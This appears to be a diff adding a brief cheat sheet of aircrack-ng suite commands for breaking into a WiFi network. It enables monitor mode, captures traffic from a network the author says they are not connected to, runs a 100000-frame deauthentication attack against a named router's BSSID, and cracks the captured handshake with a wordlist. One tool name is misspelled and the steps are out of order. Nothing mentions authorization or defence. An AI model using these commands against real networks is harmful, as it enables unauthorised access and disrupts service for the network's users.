@@ -1,0 +1,15 @@
+sudo airodump-ng --channel 6 --bssid 90:50:CA:D3:58:68 --write resultairodump wlan0
+ # capturing the traffic on a wifi network that we are not even connected.
+ 
+ airmon-ng start wlan0
+ # enabling monitor mode
+ 
+ airdump-ng wlan0
+ # gathering the information about the gateway.
+ 
+ sudo aireplay-ng --deauth 100000 -a 90:50:CA:D3:58:68 wlan0
+# performs a deauth attack against the router.
+
+
+sudo aircrack-ng handshake-file -w wordlist.txt
+#To crack the password with a wordlist
